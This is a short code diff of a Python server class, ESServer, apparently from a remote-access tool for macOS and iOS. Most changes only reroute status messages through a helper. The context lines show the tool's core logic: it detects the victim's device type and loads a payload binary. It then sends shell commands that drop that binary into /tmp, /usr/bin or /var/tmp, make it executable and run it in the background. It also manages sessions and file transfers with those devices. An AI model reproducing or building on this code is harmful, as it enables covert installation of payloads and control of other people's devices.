@@ -70,7 +70,7 @@ class ESServer:
             preload = "rm /private/tmp/espl 2> /dev/null;cat >/private/tmp/espl;chmod +x /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
         elif "arm" in CDA:
             if verbose:
-                print strinfo("Detected iOS")
+                self.h.strinfo("Detected iOS")
             binaryFile = open("src/binaries/esplios", "rb")
             payload = binaryFile.read()
             binaryFile.close()
@@ -78,7 +78,7 @@ class ESServer:
             preload = "export dti='/tmp/'; if [ $UID == '0' ]; then export dti='/usr/bin/'; fi;rm $dti'espl' 2> /dev/null;cat >$dti'espl';chmod +x $dti'espl';$dti'espl' "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
         elif "Linux" in CDA:
             if verbose:
-                print strinfo("Detected Linux, this isn't supported yet")
+                self.h.strinfo("Detected Linux, this isn't supported yet")
             conn.close()
             exit()
             return
@@ -88,7 +88,7 @@ class ESServer:
             preload = "rm /var/tmp/espl;cat >/var/tmp/espl;chmod +x /var/tmp/espl;/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
         else:
             if verbose:
-                print strinfo("device unrecognized")
+                self.h.strinfo("device unrecognized")
                 print CDA
             conn.close();
             return
@@ -228,6 +228,7 @@ class ESServer:
     def multiServerInteract(self,args):
         try:
             s = self.sessions[int(args[1])]
+            self.inputhandle = s.name
             s.conn.getpeername()[0]
             if self.shell.interact(s,self,1) == -1:
                 self.multiServerCloseSession(args) #2nd arg is id
@@ -285,14 +286,14 @@ class ESServer:
         status = receiveString(conn)
         if status == "1":
             #sendfile
-            print strinfo("Uploading "+fileName)
-            print strinfo("Size = "+filesize)
+            self.h.strinfo("Uploading "+fileName)
+            self.h.strinfo("Size = "+filesize)
             conn.send(fileData+terminator)
             #blank
             conn.recv(1)
-            print strinfo("Finished")
+            self.h.strinfo("Finished")
         else:
-            print strinfo(status)
+            self.h.strinfo(status)
 
     def downloadFile(self,command,conn):
         #send download command
